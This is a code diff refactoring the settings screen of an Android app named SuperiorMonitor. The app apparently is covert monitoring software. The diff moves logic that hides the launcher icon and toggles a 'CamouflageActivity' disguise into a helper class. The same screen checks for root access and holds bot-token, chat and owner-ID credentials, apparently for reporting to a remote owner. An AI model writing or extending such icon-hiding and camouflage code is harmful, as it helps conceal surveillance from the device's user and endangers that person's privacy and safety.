@@ -23,8 +23,7 @@ import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
-import android.content.ComponentName
-import android.content.pm.PackageManager
+// imports removed
 import androidx.compose.animation.AnimatedVisibility
 import androidx.compose.animation.core.Spring
 import androidx.compose.animation.core.animateFloatAsState
@@ -50,11 +49,7 @@ fun SettingsScreen(
     val context = LocalContext.current
     val scope = rememberCoroutineScope()
     var isLauncherHidden by remember {
-        mutableStateOf(
-            context.packageManager.getComponentEnabledSetting(
-                ComponentName(context, "com.system.superiormonitor.MainActivityLauncher")
-            ) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
-        )
+        mutableStateOf(com.system.superiormonitor.core.SystemManager.isLauncherHidden(context))
     }
     
     var showLauncherSetupDialog by remember { mutableStateOf(false) }
@@ -133,7 +128,7 @@ fun SettingsScreen(
         OuterCard {
             SectionTitle("System Checks", Icons.Default.Build)
             Spacer(modifier = Modifier.height(14.dp))
-            InnerListHost {
+            SettingsCardContainer {
                 StatusRow("Root Access", isRootEnabled, showDivider = true)
                 StatusRow("Internet Connectivity", isInternetConnected, showDivider = false)
             }
@@ -160,7 +155,7 @@ fun SettingsScreen(
                 )
             }
             Spacer(modifier = Modifier.height(14.dp))
-            InnerListHost {
+            SettingsCardContainer {
                 Column(modifier = Modifier.padding(16.dp)) {
                     val isConfigured = botToken.isNotEmpty() && chatId.isNotEmpty() && ownerUserId.isNotEmpty()
                     val addButtonText = if (isConfigured) "Replace Credentials" else "Add Credentials"
@@ -272,7 +267,7 @@ fun SettingsScreen(
                 )
             }
             Spacer(modifier = Modifier.height(14.dp))
-            InnerListHost {
+            SettingsCardContainer {
                 val subtitleColor = if (!isLauncherHidden) SuccessGreen else WarningAmber
                 Row(
                     modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 14.dp),
@@ -289,10 +284,7 @@ fun SettingsScreen(
                             if (!isChecked) {
                                 showLauncherSetupDialog = true
                             } else {
-                                val compMain = ComponentName(context, "com.system.superiormonitor.MainActivityLauncher")
-                                val compCamo = ComponentName(context, "com.system.superiormonitor.ui.CamouflageActivity")
-                                context.packageManager.setComponentEnabledSetting(compMain, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
-                                context.packageManager.setComponentEnabledSetting(compCamo, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
+                                com.system.superiormonitor.core.SystemManager.setLauncherHidden(context, false)
                                 isLauncherHidden = false
                                 Toast.makeText(context, "Launcher Icon Unhidden", Toast.LENGTH_SHORT).show()
                             }
@@ -343,15 +335,7 @@ fun SettingsScreen(
                     Button(
                         onClick = {
                             showLauncherWarningDialog = false
-                            val compMain = ComponentName(context, "com.system.superiormonitor.MainActivityLauncher")
-                            val compCamo = ComponentName(context, "com.system.superiormonitor.ui.CamouflageActivity")
-                            try {
-                                context.packageManager.setComponentEnabledSetting(compCamo, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
-                                context.packageManager.setComponentEnabledSetting(compMain, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
-                            } catch (e: Exception) {
-                                // Fallback: OS prevented disabling all launchers (Device Admin restriction).
-                                context.packageManager.setComponentEnabledSetting(compCamo, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
-                            }
+                            com.system.superiormonitor.core.SystemManager.setLauncherHidden(context, true)
                             isLauncherHidden = true
                             Toast.makeText(context, "Launcher Icon Hidden", Toast.LENGTH_SHORT).show()
                         },
@@ -372,7 +356,7 @@ fun SettingsScreen(
         OuterCard {
             SectionTitle("About", Icons.Default.Info)
             Spacer(modifier = Modifier.height(14.dp))
-            InnerListHost {
+            SettingsCardContainer {
                 Column(modifier = Modifier.padding(horizontal = 16.dp, vertical = 12.dp)) {
                     InfoRow("App Name", "SuperiorMonitor")
                     HorizontalDivider(color = DividerColor, modifier = Modifier.padding(vertical = 4.dp))
